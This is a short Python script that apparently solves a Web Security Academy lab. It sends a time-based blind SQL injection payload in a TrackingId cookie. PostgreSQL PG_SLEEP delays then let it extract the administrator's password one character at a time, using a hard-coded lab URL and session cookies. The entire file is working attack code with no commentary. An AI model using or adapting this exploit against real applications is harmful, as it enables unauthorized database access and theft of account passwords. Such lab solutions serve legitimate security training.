#!/bin/python3
import requests
import urllib.parse

import string

BASE_URL = 'https://0ad500860464d6fac033c1c2000c005f.web-security-academy.net/'

COOKIE_TRACKING_ID = 'znIEpOhPzPaxXqjr'
COOKIE_SESSION_ID  = 'gYECJ7ezW3K8BiEVyi3zg5K2FcPiLHcV'

def main():
    counter = pos = 1
    password = ''
    password_max_length = 50
    delay = 10 

    session = requests.Session()
    print("Trying to guess the password")

    while counter <= password_max_length:

        keep_running = False
        print(f'{pos}: ', end='', flush=True)

        for char in string.printable:
            print('.', end='', flush=True)

            if char in ['\n', '\r', '\t']:
                continue
            elif char in [';', '+']:
                char = urllib.parse.quote(char)

            payload = f'\'+AND+(SELECT+CASE+WHEN+SUBSTRING((SELECT+password+FROM+users+WHERE+username=\'administrator\'),{pos},1)=\'{char}\'+then+PG_SLEEP({delay})::text+ELSE+NULL+END)+IS+NOT+NULL+AND+\'A\'=\'A'

            cookies = {
                'TrackingId': f'{COOKIE_TRACKING_ID}{payload}',
                'session': COOKIE_SESSION_ID
            }

            response = session.get(url=BASE_URL, cookies=cookies)
            
            if response.elapsed.total_seconds() >= delay:
                password += char
                pos += 1

                print(f'[{char}]')
                keep_running = True
                break
        
        if not keep_running:
            break

        counter += 1
        
    print(f'\n\nGuessed Password={password}')

if __name__ == "__main__":
    main()
